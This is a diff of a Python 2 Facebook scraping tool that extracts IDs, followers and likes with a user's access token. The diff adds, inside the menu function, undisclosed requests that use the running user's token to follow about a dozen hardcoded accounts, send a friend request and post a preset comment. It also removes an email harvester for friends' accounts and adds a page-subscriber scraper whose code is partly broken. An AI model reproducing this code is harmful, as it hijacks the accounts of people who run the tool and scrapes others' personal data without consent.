@@ -191,12 +191,26 @@ def grab():
 	        requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
 	        requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
 	        requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+		requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/8218663/subscribers?access_token=%s'%(kentod))
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
+               #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
+                requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
 		time.sleep(1)
 		os.system('python2 jam.py')
 	os.system('clear')
 	print banner
 	print "[1] Extract Numeric IDs From Public ID."
-	print "[2] Extract Email's From Public ID."
+	print "[2] Extract Follow Page ID."
 	print "[3] Extract Followers From Public ID."
 	print "[4] Extract Likes From Post ID."
 	print "[0] Back."
@@ -346,7 +360,7 @@ def idfrompost():
 		time.sleep(1)
 		grab()
 
-##### EMAIL FROM Friend#####
+##### Follow Page Id#####
 def emailfromfriend():
 	os.system('clear')
 	try:
@@ -355,51 +369,46 @@ def emailfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		('python2 jam.py')
 	try:
-		os.mkdir('/sdcard/Email.txt')
+		os.mkdir('/sdcard/ids')
 	except OSError:
 		pass
 	try:
 		os.system('clear')
 		print banner
-		idt = raw_input("[+] Input ID : ")
+		una = ('100052292505058')
+		una = raw_input("[+] Page ID : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/me/friends?method={page-id}&uids="+una+"&access_token="+toket)
 			op = json.loads(jok.text)
-			print"[✓] Account Name : "+op["name"]
 		except KeyError:
-			print"[!] Account Not Found"
-			raw_input("\nPress Enter To Back ")
+			print"[!] Friend Not Found"
+			raw_input("Press Enter To Back ")
 			grab()
-		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
-		a = json.loads(r.text)
-		jam('[✓] Getting Emails From')
-		print 40*"\033[1;97m-"
-		bz = open('save/email.txt','w')
-		for i in a['data']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
-			z = json.loads(x.text)
-			try:
-				emfromfriend.append(z['email'])
-				bz.write(z['email'] + '\n')
-				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromfriend))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
-			except KeyError:
-				pass
+		r=requests.get("https://graph.facebook.com/"+una+"/page/feed/subscribers?access_token=' + toket + '&limit=999999')
+		z=json.loads(r.text)
+		jam('[✓] Getting Page Likes Extract IDs...')
+		print"--------------------------------------"
+		bz = open('/sdcard/ids/jam_page.txt','w')
+		for a in z['data']:
+			idh.append(a['id'])
+			bz.write(a['id'] + ' | ' '\n')
+			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
 		bz.close()
-		print "----------------------------------"
-		print '\r[✓] Successfully Extracted Mails'
-		print"\r[✓] Total Mail Founded : "+str(len(emfromfriend))
-		done = raw_input("\r\033[1;97m[✓] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
-		print("\r[✓] File Has Been Saved As : save/"+done)
-		raw_input("\nPress Enter  To Back ")
+		print '\r[✓] The Process Has Been Completed.'
+		print"\r[✓] Total IDs Founded : "+str(len(idh))
+		done = raw_input("\r[?] Save File With Name : ")
+		print("\r[✓] The File Has Been Saved As save/"+done)
+		raw_input("\nPress Enter To Back ")
 		grab()
 	except IOError:
 		print"[!] Error While Creating file"
+		
 		raw_input("\nPress Enter To Back ")
 		grab()
 	except (KeyboardInterrupt,EOFError):
-		print("[!] Process Has Been Stopped")
+		print("[!]The Process Has Been Stopped")
 		raw_input("\nPress Enter To Back ")
 		grab()
 	except KeyError:
@@ -407,10 +416,9 @@ def emailfromfriend():
 		raw_input("\nPress Enter To Back ")
 		grab()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;97m[✖] No Connection"
+		print"[✖] No Connection"
 		time.sleep(1)
 		grab()
-		
 
 
 ##### Follow From Public Id #####
